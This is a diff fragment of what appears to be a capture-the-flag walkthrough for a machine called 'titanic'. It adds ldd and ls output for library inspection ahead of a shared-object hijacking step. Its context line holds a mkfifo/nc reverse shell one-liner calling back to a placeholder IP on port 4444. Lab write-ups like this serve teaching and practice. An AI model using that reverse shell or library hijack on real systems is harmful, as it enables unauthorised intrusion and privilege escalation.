@@ -219,6 +219,21 @@ system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP> 4444 >/tmp/
 exit(0);
 }
 ```
++ We can check the available lib:
+```bash
+developer@titanic:~$ ldd /usr/sbin/apache2
+	linux-vdso.so.1 (0x00007ffcbdb5d000)
+	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f81410ce000)
+	libaprutil-1.so.0 => /lib/x86_64-linux-gnu/libaprutil-1.so.0 (0x00007f81410a0000)
+	libapr-1.so.0 => /lib/x86_64-linux-gnu/libapr-1.so.0 (0x00007f8141063000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8140e3a000)
+	libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007f8140e00000)
+	libexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007f8140dcd000)
+	libuuid.so.1 => /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007f8140dc4000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007f814120a000)
+developer@titanic:~$ ls -l /usr/lib/x86_64-linux-gnu/libxcb.so.1
+lrwxrwxrwx 1 root root 15 Mar 24  2022 /usr/lib/x86_64-linux-gnu/libxcb.so.1 -> libxcb.so.1.1.0
+```
 
 + Compile the code into a shared object at the location `/opt/app/static/assets/images` where the file `identify_images.sh` execute.
 
